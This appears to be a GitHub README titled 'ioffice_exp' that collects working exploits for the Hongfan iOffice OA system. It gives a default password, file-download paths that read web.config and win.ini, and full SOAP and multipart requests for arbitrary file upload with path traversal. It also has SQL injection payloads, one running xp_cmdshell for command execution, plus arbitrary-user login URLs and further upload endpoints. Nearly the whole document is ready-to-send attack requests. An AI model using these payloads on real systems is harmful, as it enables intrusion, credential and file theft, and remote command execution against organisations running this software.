# ioffice_exp 从互联网收集的红帆oa漏洞
## 默认密码
```
Everyone / 111111     
```
## ioFileDown.aspx任意文件下载
/ioffice/prg/interface/ioFileDown.aspx?sFilePath=/ioffice/web.config  
/iOffice/prg/set/ioCom/ioFileExport.aspx?url=C:/Windows/win.ini
## FaxService.asmx 任意文件上传
```
/iOffice/prg/set/wss/FaxService.asmx
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <SaveConvertTif xmlns="http://tempuri.org/">
      <FaxID>1</FaxID>
      <Pages>2</Pages>
      <FileName>../../../../2.txt</FileName>
      <FileContent>dGVzdDEyMw==</FileContent>
    </SaveConvertTif>
  </soap:Body>
</soap:Envelope>
```
## iorepsavexml.aspx任意文件上传
```
/iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=hiword.txt&filepath=/upfiles/rep/pic/
```
## ioRepPicAdd.aspx任意文件上传
```
/ioffice/prg/set/Report/ioRepPicAdd.aspx
------WebKitFormBoundary92UKW0leBBAHGaI4
Content-Disposition: form-data; name="__EVENTTARGET"

ctl00$cntButton$cmdOK
------WebKitFormBoundary92UKW0leBBAHGaI4
Content-Disposition: form-data; name="__EVENTARGUMENT"


------WebKitFormBoundary92UKW0leBBAHGaI4
Content-Disposition: form-data; name="__VIEWSTATE"

qqqq
------WebKitFormBoundary92UKW0leBBAHGaI4
Content-Disposition: form-data; name="ctl00$cntForm$File1"; filename="hiword.txt"
Content-Type: image/png

hiword!!!

------WebKitFormBoundary92UKW0leBBAHGaI4--
```
## ioAssistance.asmx sql注入导致rce
```http
/ioffice/prg/set/wss/ioAssistance.asmx
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/\">
<soap:Body>
  <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
<sql>exec master.dbo.xp_cmdshell 'cmd /c  whoami'</sql>
</GetLoginedEmpNoReadedInf>
</soap:Body>
</soap:Envelope>
```
## udfGetDocStep.asmx sql注入
```http
POST /ioffice/prg/interface/udfGetDocStep.asmx HTTP/1.1
Host: 127.0.0.1
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/GetDocStep"
 
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
    <GetDocStep xmlns="http://tempuri.org/">
        <docid>1'</docid>
    </GetDocStep>
    </soap:Body>
</soap:Envelope>  
```
## ioDesktopData.asmx sql注入
```http
POST /iOffice/prg/set/wss/ioDesktopData.asmx HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
SOAPAction: http://tempuri.org/GetDepSchedule
Content-Type: text/xml;charset=UTF-8
Content-Length: 282

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
<soap:Header/>
<soap:Body>
<tem:GetDepSchedule>
<!--type: string-->
<tem:EmpLoginID>111*</tem:EmpLoginID>
</tem:GetDepSchedule>
</soap:Body>
</soap:Envelope>
```
## 任意用户登录
/iOffice/prg/interface/iologin215host.aspx  
/iOffice/prg/interface/iologin.aspx?iempcode=SENHRkU=&reurl=1
## wssRtSyn.asmx sql注入
/iOffice/prg/set/wss/wssRtSyn.asmx?op=SubmitShowMsg
```http
POST http://xxxxxx/iOffice/prg/set/wss/wssRtSyn.asmx HTTP/1.1
Host: xxxxxx
SOAPAction: http://iOffice.net/iOffice/ioRtSyn/SubmitLogInfo
Content-Type: text/xml
Cookie: ASP.NET_SessionId=s5zjcxf0isg4r045ujqnyur3
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Content-Length: 457
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Connection: Keep-alive

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://iOffice.net/iOffice/ioRtSyn">
<soap:Header />
<soap:Body>
<tns: GetRootBranchName>
<tns:ServerHost>111‘</tns:ServerHost>
</tns: GetRootBranchName>
</soap:Body>
</soap:Envelope>
```
```
POST http://xxxxx/iOffice/prg/set/wss/wssRtSyn.asmx HTTP/1.1
Host: xxxxxx
SOAPAction: http://iOffice.net/iOffice/ioRtSyn/SubmitLogInfo
Content-Type: text/xml
Cookie: ASP.NET_SessionId=s5zjcxf0isg4r045ujqnyur3
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Content-Length: 457
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Connection: Keep-alive

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://iOffice.net/iOffice/ioRtSyn">
<soap:Header />
<soap:Body>
<tns:SubmitLogInfo>
<tns:data>TzwSVsOw</tns:data>
<tns:ServerHost>222‘</tns:ServerHost>
</tns:SubmitLogInfo>
</soap:Body>
</soap:Envelope>
```
## UserForm.asmx sql注入
```http
POST http://xxxxx/ioffice/prg/set/wss/UserForm.asmx HTTP/1.1
Host: xxxxxx
Content-Type: text/xml; charset=utf-8
Content-Length: 386
SOAPAction: "http://tempuri.org/GetBase"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
 <soap:Body>
   <GetBase xmlns="http://tempuri.org/">
     <modCode>string'</modCode>
     <BaseName>string</BaseName>
   </GetBase>
 </soap:Body>
</soap:Envelope>
```
## ioAssistance2.asmx sql注入
```http
POST http://xxxxx/ioffice/prg/set/wss/ioAssistance2.asmx HTTP/1.1
Host: xxxxxx
Content-Type: text/xml; charset=utf-8
Content-Length: 347
SOAPAction: "http://tempuri.org/GetEmpInf"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
 <soap:Body>
   <GetEmpInf xmlns="http://tempuri.org/">
     <sql>select (@@version) </sql>
   </GetEmpInf>
 </soap:Body>
</soap:Envelope>
```
## udfmr.asmx sql注入
```
POST http://xxx/iOffice/prg/set/wss/udfmr.asmx HTTP/1.0
Host: xxxx
X-Real-IP: xxxx
X-Forwarded-For: xxxx
Connection: close
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/ioffice/udfmr/GetEmpSearch"


<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
<condition>1=@@version</condition>
</GetEmpSearch>
</soap:Body>
</soap:Envelope>
```
## ioFileExport.aspx后台任意文件读取
```
/iOffice/prg/set/iocom/ioFileExport.aspx? url=/ioffice/upfiles/otherfiles/Picture/3/2023/4/eee.asp=eee.asp&ContentType=application/octet-stream
/iOffice/prg/set/iocom/ioFileExport.aspx? url=xxxxxxxx&filename=eeee.asp&ContentType=application/octet-stream
```
## 后台任意文件上传
```
/ioffice/prg/udf/Component/imgupload.aspx
需要修改Content-Type: image/png
```
其他上传点
```
/ioffice/prg/set/HtmlEdit/editor/dialog/fck_upload.aspx
/ioffice/prg/set/HtmlEdit/plugins/image.aspx
```
